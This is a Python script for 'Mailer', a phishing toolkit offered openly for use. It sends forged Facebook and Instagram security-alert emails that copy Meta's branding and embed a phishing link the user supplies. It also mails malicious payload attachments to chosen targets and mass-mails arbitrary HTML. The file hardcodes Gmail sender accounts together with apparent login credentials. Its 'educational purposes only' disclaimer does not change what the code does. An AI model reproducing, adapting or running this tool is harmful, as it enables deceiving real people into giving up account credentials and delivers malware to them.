import pyfiglet
try:
    import os
    import datetime
    import smtplib
    import ssl
    import time as t
    import colorama
    from colorama import *
    colorama.init(autoreset=False)
    from email.mime.text import MIMEText
    from email.mime.multipart import MIMEMultipart
    
    from email.mime.base import MIMEBase
    from email import encoders
except:
    os.system("""
    apt install pip2
    pip install smtplib
    pip install datetime
    pip  install colorama
    """)
time = datetime.datetime.now()
os.system("clear")
print(Fore.YELLOW + "[" + Fore.RED + "!" +Fore.YELLOW + "]" + Fore.RED + " Disclaimer:Use this script for educational purposes only\n " +Fore.CYAN + "Spider Anongreyhat " + Fore.RED + "won\'t be responsible for any shit")
t.sleep(3)
colorama.init(autoreset=False)
SSL = 465 #SSL PORT
"""
def expiry():
    exp = datetime.datetime(2022, )
    current = datetime.datetime.now() 
        os.system("clear")
        print(Fore.RED + "This Script is no longer free\nKindly Subscribe to use this script\nKindly message the developer for subscription")
        code = input(Fore.YELLOW + Back.RED + "Enter activation code:" + Style.RESET_ALL + " ")
        if code != "01010100011001010111001001101101011101010111100001001000011000010110001101101011011110100010000001010011011011110110001101101001011001010111010001111001":
            print(Fore.RED + "Invalid activation code")
            t.sleep(3)
            os.system("xdg-open https://wa.me/2349052863644")
            expiry()
expiry()
"""
#Function for looping
def loop():
    os.system("clear")
    print("\033[1;33;40m")
    head = pyfiglet.figlet_format("M a i l e r")
    print(Fore.YELLOW + head + Style.RESET_ALL)
    print(Fore.RED +"version 1.5".center(60) + Style.RESET_ALL)
    print(Fore.YELLOW + "[+] " + Fore.GREEN + "Tool Name:Mailer\n" + Fore.YELLOW + "[+] " + Fore.GREEN + "Author:Spider Anongreyhat(Anonspidey)\n" + Fore.YELLOW + "[+] " + Fore.GREEN + "Version:1.5\n" + Fore.YELLOW + "[+] " + Fore.GREEN + "Team:TermuxHackz Society\n" + Fore.YELLOW + "[+] " + Fore.GREEN + "Github:https://github.com/spider863644\n" + Fore.YELLOW + "[+] " + Fore.GREEN + "WhatsApp:+2349052863644")
    print(Fore.RED + ">>>>>>>>>>>>>>>>>>>>>>>>>>>>" + Fore.CYAN + "Choose a valid option" + Fore.RED + "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<")
    print(Fore.MAGENTA + "[√]Turn on your mobile data connection")
    t.sleep(3)
    # The Option for the attacks
    print(Fore.BLUE + """
[1]Social Media Attack
[2]Send Malicious file
[3]Mass Mailer
[4]Update program
[5]Exit Program
[6]About
[7]Credit
[8]Report bugs
[9]Join our whatsapp group chat
    """)
    options = (input(Fore.YELLOW + Back.RED + "Enter a number " + Style.RESET_ALL))
    os.system("clear")
    # Four indent
    if options == "1":
        #For Social media
        print(Fore.BLUE + """
[1]Facebook
[2]Instagram
        """)
        social = (input(Fore.YELLOW + Back.RED + "Choose a social media " + Style.RESET_ALL))
        os.system("clear")
        #Eight indent
        if social == "1":
            #For Facebook
            print(Fore.BLUE + """
[1]Compromised Facebook Account
[2]Changed Password
[3]Tried To login
[4]Custom(Not available)
""")
            facebook = (input(Fore.YELLOW + Back.RED + "Choose an option " + Style.RESET_ALL))
            #Compromised Facebook account
            #12 indentation
            if facebook == "1":
                email = input(Fore.GREEN + "Enter Target Email address: " + Style.RESET_ALL)
                link = input(Fore.GREEN + "Enter your phishing link: " + Style.RESET_ALL)
                name = input(Fore.GREEN + "Enter the facebook username of the target: " + Style.RESET_ALL)
                #Email for compromised facebook
                sender = "f98108847@gmail.com"
                phonenumber = "09052863644"
                message = MIMEMultipart("alternative")
                message["Subject"] = "Compromised Facebook Account"
                message["From"] = sender
                message["To"] = email
                html = """
                <html>
                <head>  
                <title>Facebook: Facebook account got compromised</title>
                <meta name="viewport"
                content="width=device-width
                initial-scale=1.0">
                </head>
                <body>
                <style>
                body {
                background-color:white;
                color:black;
                
                }
                </style> 
                <h4> Hi, """ + name + """ </h4>
                <p> A new device logged into your facebook account on """ + time.strftime("%A, %B %d, %Y at %I:%M% %z") + """ </p>
                <pre>
                Operating      Windows
                System:   
                Browser:        Chrome
                IP address:    192.168.40.221
                Estimated       Ormoc City, Eastern
                location:        VISAYAS, PH
                </pre>
                If this is you kindly disregard this email. <p> If this was not you <a href=""" + link + """ + > please reset your password </a> to secure your account. </p> </h4
                <br>  </br>
                <br>  </br>
                <br>  </br>
                <br>  </br>
                <h6> <p> <center> From </center> <center> Meta <center> © Facebook. Meta Platforms, Inc, 1601 Willow </center> <center> Road, Menlo Park, CA 94025, US </center>  </h6>
                <p> <h6> <center> This message was sent to </center> <center> <a href="">""" + email + """</a>  and intended for </center> <center> """ + name + """. Not your account? <a href="">  </a> <a href=""> Remove your email address </a> from this account </center> </h6> </p>
                </body> 
                </html>
                """
                part =MIMEText(html, "html")  
                message.attach(part)
                context = ssl.create_default_context()
                with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
                    print(Fore.GREEN + "Loging into the server..")
                    try:
                        server.login(sender, phonenumber)
                        print(Fore.GREEN + "Logged In Succesfully")
                    except:
                        print(Fore.RED + "Login failed!\nCheck your data connection and try again")
                        t.sleep(3)
                        loop()
                    print(Fore.GREEN + "Sending mail to " + email)
                    try:
                        server.sendmail(
                        sender, email, message.as_string()
                    )
                        print(Fore.GREEN + "Mail sent sucessfully")
                    except:
                        print(Fore.RED + "Failed!\nCouldn\'t send mail due to some error")
                        t.sleep(4)
                        loop()
            #Changed password             
            elif facebook == "2":
                email = input(Fore.GREEN + "Enter target email address: " + Style.RESET_ALL)
                link = input(Fore.GREEN + "Enter phishing link: " + Style.RESET_ALL)
                name = input(Fore.GREEN + "Enter target firstname on facebook: " + Style.RESET_ALL)
                sender = "f98108847@gmail.com"
                phonenumber = "09052863644"
                message = MIMEMultipart("alternative")
                message["Subject"] = "Facebook Changed Password"
                message["From"] = sender
                message["To"] = email
                html = """
                <html>
               <head>  
               <title>Facebook: Password Changed</title>
               <meta name="viewport"
               content="width=device-width
               initial-scale=1.0">
               </head>
               <body>
               <style>
               body {
               background-color:white;
               color:black;
               
               }
               </style> 
               <h4> Hi, """ + name + """ </h4>
               <p> Your facebook password was changed recently on """ + time.strftime("%A, %B %d, %Y at %I:%M%") + """ </p>
               <pre>
               Operating      Windows
               System:   
               Browser:        Chrome
               IP address:    192.168.49.221
               Estimated       Ormoc City, Eastern
               location:        VISAYAS, PH
               </pre>
               If this is you kindly disregard this email. <p> If this was not you <a href=""" + link + """  > please reset your password </a> to secure your account. </p> </h4
               <br>  </br>
               <br>  </br>
               <br>  </br>
               <br>  </br>
               <h6> <p> <center> From </center> <center> Meta <center> © Facebook. Meta Platforms, Inc, 1601 Willow </center> <center> Road, Menlo Park, CA 94025, US </center>  </h6>
               <p> <h6> <center> This message was sent to </center> <center> <a href="">""" + email + """</a>  and intended for </center> <center> """ + name + """. Not your account? <a href="">  </a> <a href=""> Remove your email address </a> from this account </center> </h6> </p>
               </body> 
               </html>
            """
                part = MIMEText(html, "html")
                message.attach(part)
                context = ssl.create_default_context()
                with smtplib.SMTP_SSL("smtp.gmail.com", SSL, context=context)as server:
                    print(Fore.GREEN + "[!] Signing in into the server")
                    try:
                        server.login(sender, phonenumber)
                        print(Fore.GREEN + "[✓] Logged in sucessfully")
                    except:
                        print(Fore.RED + "[!] Failed to log in!")
                        t.sleep(2)
                        loop()
                    print(Fore.GREEN + "Sending mail to ", email)
                    try:
                        server.sendmail(
                        sender, email, message.as_string()
                        )
                        print(Fore.GREEN + "[√]Mail sent successfully")
                    except:
                        print(Fore.RED + "Message sent failed!")
                        t.sleep(3)
                        loop()
            #tried to login
            elif facebook== "3":
                email = input(Fore.GREEN+ "Enter target email: " + Style.RESET_ALL)
                link = input(Fore.GREEN + "Enter phishing link: " + Style.RESET_ALL)
                name = input(Fore.GREEN + "Enter the first name of your target on facebook: " + Style.RESET_ALL)
                sender = "f98108847@gmail.com"
                phonenumber = "09052863644"
                message = MIMEMultipart("alternative")
                message["Subject"] = "Facebook: Someone tried to login into your account"
                message["From"] = sender
                message["To"] = email
                html = """
                
                <html>
               <head>  
               <title>Facebook: Password Changed</title>
               <meta name="viewport"
               content="width=device-width
               initial-scale=1.0">
               </head>
               <body>
               <style>
               body {
               background-color:white;
               color:black;
               
               }
               </style> 
               <h4> Hi, """ + name + """ </h4>
               <p> Someone just used your password to try to sign in to your account. Facebook blocked them, but you should check what happened. """ + time.strftime("%A, %B %d, %Y at %I:%M%") + """ </p>
               <pre>
               Operating      Windows
               System:   
               Browser:        Chrome
               IP address:    192.168.49.221
               Estimated       Ormoc City, Eastern
               location:        VISAYAS, PH
               </pre>
               If this is you kindly disregard this email. <p> If this was not you <a href="""  + link + """  > please reset your password </a> to secure your account. </p> </h4
               <br>  </br>
               <br>  </br>
               <br>  </br>
               <br>  </br>
               <h6> <p> <center> From </center> <center> Meta <center> © Facebook. Meta Platforms, Inc, 1601 Willow </center> <center> Road, Menlo Park, CA 94025, US </center>  </h6>
               <p> <h6> <center> This message was sent to </center> <center> <a href="">""" + email + """</a>  and intended for </center> <center> """ + name + """. Not your account? <a href="">  </a> <a href=""> Remove your email address </a> from this account </center> </h6> </p>
               </body> 
               </html>
            """
                part = MIMEText(html, "html")
                message.attach(part)
                context = ssl.create_default_context()
                with smtplib.SMTP_SSL("smtp.gmail.com", SSL, context=context) as server:
                    print(Fore.GREEN + "Logging into the server")
                    t.sleep(3)
                    try:
                        server.login(sender, phonenumber)
                        print(Fore.GREEN + "[✓] Login succesfully")
                    except:
                        print(Fore.RED + "[!] Login failed\nPlease try again later")
                        t.sleep(4)
                        loop()
                    print(Fore.GREEN + "Sending mail to" + email)
                    t.sleep(2)
                    try:
                        server.sendmail(
                        sender, email, message.as_string()
                        )
                        print(Fore.GREEN + "[✓] Mail sent sucessfully")
                    except:
                        print(Fore.RED + "[!] Failed to send email")
                        t.sleep(4)
                        loop()
            elif facebook == "4":
                print(Fore.RED + "Not available yet")
                t.sleep(4)
                loop()
                #This is the end for facebook 
                #Done with facebook
            else:
                print(Fore.RED + "Invalid option")
                t.sleep(3)
                loop()
        elif social == "2":
            #For instagram
            print(Fore.BLUE + """
[1]Compromised Instagram account
[2]Password Changed
[3]Tried to login
[4]Custom(Not available)
            """)
            instagram = input(Fore.YELLOW +Back.RED + "Choose a valid option: " + Style.RESET_ALL)
            #12 indent
            #Compromised Instagram account
            if instagram == "1":
                email = input(Fore.GREEN + "Enter target email: " + Style.RESET_ALL)
                name = input(Fore.GREEN + "Enter victim username on instagram: " + Style.RESET_ALL)
                link = input(Fore.GREEN + "Enter instagram phishing link: " + Style.RESET_ALL)
                sender = "i2625744@gmail.com"
                phonenumber = "09052863644"
                message = MIMEMultipart("alternative")
                message["Subject"] = "Compromised instagram account"
                message["From"] = sender
                message["To"] = email
                html = """
                <!DOCTYPE html>
<html lang="eng">
<title>Instagram| Changed password</title>
<head>
<meta charset="UTF-8">
<meta name="view"
>
</head>
<img src="" alt="photo not available">
<h3>Hi """ + name + """</h3>
<p>We detected a new device signed in into your account on   """  + time.strftime("%H:%M on %A, %B %Y.") + """<br>
<br>
If this was not you, <a href="""  + link +  """>please secure your account</a></p>
<br> <br>
<br> <br>
<br> <br>
<br>  <br>
<h6><center>From<br>
Meta<br>
©Facebook. Meta platform, ics, 1601 Willow<br>
Road, Menlo Park, CA 94025, US
<br> <br>
<br> <br>
This message was sent to<br>
""" + email + """ and intended for <br>""" + name + """. Not your account? <a href="">remove your email address from this account
</html>
                """
                part = MIMEText(html, "html")
                message.attach(part)
                context = ssl.create_default_context()
                with smtplib.SMTP_SSL("smtp.gmail.com", SSL, context=context) as server:
                    print(Fore.GREEN + "Logging into the server")
                    t.sleep(2)
                    try:
                        server.login(sender, phonenumber)
                        print(Fore.GREEN + "[✓] Login sucessfully")
                    except:
                        print(Fore.RED + "[!] Login failed\nTry again later")
                        t.sleep(3)
                        loop()
                    print(Fore.GREEN + "Sending mail to", email)
                    t.sleep(2)
                    try:
                        server.sendmail(
                        sender, email, message.as_string()
                        )
                        print(Fore.GREEN + "[✓] Mail sent sucessfully")
                    except:
                        print(Fore.RED + "[!] Failed to send email\nTry again later")
                        t.sleep(3)
                        loop()
            #For Changed password(Instagram)
            elif instagram == "2":
                sender = "i2625744@gmail.com"
                phonenumber = "09052863644"
                email = input(Fore.GREEN + "Enter target email address: " + Style.RESET_ALL)
                name = input(Fore.GREEN + "Enter target first name on instagram: " + Style.RESET_ALL)
                link = input(Fore.GREEN + "Enter the phishing link: " + Style.RESET_ALL)
                message = MIMEMultipart("alternative")
                message["Subject"] = "Password Changed"
                message["From"] = sender
                message["To"] = email
                html = """
                <!DOCTYPE html>
<html lang="eng">
<title>Instagram| Changed password</title>
<head>
<meta charset="UTF-8">
<meta name="view"
>
</head>
<img src="" alt="photo not available">
<h3>Hi """ + name + """</h3>
<p>Your password was recently changed at """ + time.strftime("%H:%M %Z on %A, %B %Y.") + """<br>
<br>
If this was not you, <a href="""  + link +  """>please secure your account</a></p>
<br> <br>
<br> <br>
<br> <br>
<br>  <br>
<h6><center>From<br>
Meta<br>
©Facebook. Meta platform, ics, 1601 Willow<br>
Road, Menlo Park, CA 94025, US
<br> <br>
<br> <br>
This message was sent to<br>
""" + email + """ and intended for <br>""" + name + """. Not your account? <a href="">remove your email address from this account
</head>
</html>
                """
                part = MIMEText(html, "html")
                message.attach(part)
                context = ssl.create_default_context()
                with smtplib.SMTP_SSL("smtp.gmail.com", SSL, context=context) as server:
                    print(Fore.GREEN + 'Logining into the server')
                    try:
                        server.login(sender, phonenumber)
                        print(Fore.GREEN + "[✓] Logged in succesfully")
                    except:
                        print(Fore.RED + "[!] Failed to login\nTry again later")
                        t.sleep(3)
                        loop()
                    print(Fore.GREEN + "Sending mail to", email)
                    t.sleep(2)
                    try:
                        server.sendmail(
                        sender, email, message.as_string()
                        )
                        print(Fore.GREEN + "[✓] Mail sent successfully")
                    except:
                        print(Fore.RED + "[!] Failed to send mail\nTry again later")
                        t.sleep(3)
                        loop()
            #Tried to login instagram
            elif instagram == "3":
                sender = "i2625744@gmail.com"
                phonenumber = "09052863644"
                email = input(Fore.GREEN + "Enter target email address: " + Style.RESET_ALL)
                name = input(Fore.GREEN + "Enter target username on instagram: " + Style.RESET_ALL)
                link = input(Fore.GREEN + "Enter phishing link: " + Style.RESET_ALL)
                message = MIMEMultipart("alternative")
                message["Subject"] = "Instagram: Someone tried to login"
                message["From"] = sender
                message["To"] = email
                html = """
<!DOCTYPE html>
<html lang="eng">
<title>Instagram| Changed password</title>
<head>
<meta charset="UTF-8">
<meta name="view"
>
</head>
<img src="" alt="photo not available">
<h3>Hi  """+ name + """  </h3>
<p>Someone tried to login to your account with your password on  """ + time.strftime("%H:%M %Z on %A, %B %Y.") + """<br>
<br>
If this was not you, <a href="""  + link +  """>please secure your account</a></p>
<br> <br>
<br> <br>
<br> <br>
<br>  <br>
<h6><center>From<br>
Meta<br>
©Facebook. Meta platform, ics, 1601 Willow<br>
Road, Menlo Park, CA 94025, US
<br> <br>
<br> <br>
This message was sent to<br>
""" + email + """ and intended for <br>""" +  name + """. Not your account? <a href="">remove your email address from this account
                """
                part = MIMEText(html, "html")
                message.attach(part)
                context = ssl.create_default_context()
                with smtplib.SMTP_SSL("smtp.gmail.com", SSL, context=context) as server:
                    print(Fore.GREEN + "logining into ther server")
                    try:
                        server.login(sender, phonenumber)
                        print(Fore.GREEN + "[✓] Logged in sucessfully")
                    except:
                        print(Fore.RED + '[!] Failed to login\n try again')
                        t.sleep(3)
                        loop()
                    print(Fore.GREEN + "Sending mail to", email)
                    try:
                        server.sendmail(
                        sender, email, message.as_string()
                        )
                        print(Fore.GREEN + "[✓] Mail sent succesfully")
                    except:
                        print(Fore.RED + "[!] Failed to send mail")
                        t.sleep(3)
                        loop()
            #for  custom mail
            elif instagram == "4":
                        print(Fore.RED + "Not available!")
                        t.sleep(3)
                        loop()
            else:
                print(Fore.RED + "Invalid option") 
                t.sleep(3)
                loop()
        else:
            print(Fore.RED + "Invalid option")
            t.sleep(3)
            loop()
            #payload
    elif options == "2":
        print(Fore.BLUE + "Malicious file Sender")
        sender = "i2625744@gmail.com"
        phonenumber = "09052863644"
        email = input(Fore.GREEN + "Enter your target email address: " + Style.RESET_ALL)
        print(Fore.RED + "________________________________________")
        filename = input(Fore.GREEN + 'Input file part and file name\nExample:anonspider/home/payload.pdf: ' + Style.RESET_ALL)
        body = input(Fore.GREEN + "Enter message[optional]: " + Style.RESET_ALL)
        message = MIMEMultipart()
        message["From"] = sender
        message["To"] = email
        message["Subject"] = input(Fore.GREEN + "Enter Subject: " + Style.RESET_ALL)
        message.attach(MIMEText(body, "html"))
        print(Fore.BLUE + "Checking if file exist")
        t.sleep(2)
        try:
            open(filename, "rb")
            print(Fore.GREEN + "The file you are trying to send exist")
        except:
            print(Fore.RED + "The file you are trying to send does not exist!")
            t.sleep(3)
            loop()
        with open(filename, "rb") as attachment:
            part = MIMEBase("application", "octet-stream")
            part.set_payload(attachment.read())
            encoders.encode_base64(part)
        part.add_header(
        "content-Disposition",
        f"attachment; filename= {filename}",
        )
        message.attach(part)
        text = message.as_string()
        context = ssl.create_default_context()
        with smtplib.SMTP_SSL("smtp.gmail.com", SSL, context=context) as server:
            print(Fore.GREEN + "Logining into the server")
            try:
                server.login(sender, phonenumber)
                print(Fore.GREEN + "[✓]Login sucessfully")
            except:
                print(Fore.RED + "[!]Failed to login")
                t.sleep(4)
                loop()
            print(Fore.GREEN + "Sending file to ", email)
            try:
                server.sendmail(sender, email, text)
                print(Fore.GREEN + "[✓]File sent sucessfully")
            except:
                print(Fore.RED + "[!]Failed to send file")
                t.sleep(3)
                loop()
    elif options == "3":
        #Mass mailer
        print(Fore.BLUE + "MASS MAILER\nSend a single mail to many recepient")
        sender = "i2625744@gmail.com"
        phonenumber = "09052863644"
        email = input(Fore.GREEN + "Entet target email addresses" + Fore.RED + "[For multiple emails, seperate them with comma]: " + Style.RESET_ALL)
        subject = input(Fore.GREEN + "Enter Subject of the mail: " + Style.RESET_ALL)
        message = MIMEMultipart("alternative")
        message["From"] = sender
        message["To"] = email
        message["Subject"] = subject
        html = input(Fore.GREEN + "Enter message" + Fore.RED + "[Note:Message is in text and html format...Type \"<br>\" to enter another paragraph...And you can input your link manually since its in html format]: " + Style.RESET_ALL)
        part = MIMEText(html, "html")
        message.attach(part)
        context = ssl.create_default_context()
        with smtplib.SMTP_SSL("smtp.gmail.com", SSL, context=context) as server:
            print(Fore.GREEN + "Signing into the server")
            t.sleep(3)
            try:
                server.login(sender, phonenumber)
                print(Fore.GREEN + "[✓] Logged in sucessfully")
            except:
                print(Fore.RED + "[!] Login failed")
                t.sleep(3)
                loop()
            print(Fore.GREEN + "Sending mail to", email)
            t.sleep(3)
            try:
               server.sendmail(sender, email, message.as_string()
               )
               print(Fore.GREEN + "[✓] Mail sent sucessfully")
            except:
               print(Fore.RED + "Failed to send Mail!")
               t.sleep(3)
               loop()
    elif options == "5":
        print(Fore.GREEN + "Thanks for using mailer\nKindly follow me on github")
        t.sleep(3)
        exit()
    elif options == "4":
        print(Fore.YELLOW + Back.RED + "Updating mailer" + Style.RESET_ALL)
        t.sleep(3)
        os.system("""
        cd $HOME
        rm -rf Mailer
        git clone https://github.com/spider863644/Mailer
        """)
        print(Fore.BLUE + """
        Now type the following commands
cd $HOME
cd Mailer
python3 mailer.py
""")
        exit()
    elif options == "6":
        print(Fore.GREEN + "ABOUT MAILER")
        print(Fore.BLUE + """
Mailer is a python script created by Spider Anongreyhat(Anonspidey)

FEATURES OF MAILER:
1. Social media attack (Spear-Phishing)
2.Payload Sender
3. Mass Mailer

TESTED ON:
Linux(Parrot OS)
Termux
""")
    elif options == "7":
        print(Fore.YELLOW + Back.RED + "CREDIT GOES TO THE SUPPORTERS  MENTIONED BELOW" + Style.RESET_ALL + Fore.GREEN + """
Spider Anongreyhat
AnonyminHack5
N00B H4X0R
Booby
Lekzi
Chintan
Yahaya
Black_code100
Rash
""")
    elif options == "8":
        print(Fore.BLUE + "REPORTING OF BUGS\nREDIRECTING USER TO MY INBOX FOR BUG REPORT")
        print(Fore.GREEN + """
Kindly report any bugs or error you faced while using Mailer """ + Fore.RED + """
Note:Report with screenshot or screen record """
)
        t.sleep(6)
        os.system("xdg-open https://wa.me/2349052863644")
    elif options == "9":
        print(Fore.BLUE + "REDIRECTING TO OUR WHATSAPP GROUP CHAT")
        t.sleep(3)
        os.system("xdg-open https://chat.whatsapp.com/BivW6pA9Emu9bDM2rZkaQy")
    else:
        print(Fore.RED + "Invalid option")
        t.sleep(3)
        loop()
    cont = input(Fore.YELLOW + Back.RED + "Do you wanna continue? [y/n]: " + Style.RESET_ALL)
    if cont == "y" or cont == "Y":
        loop()
loop()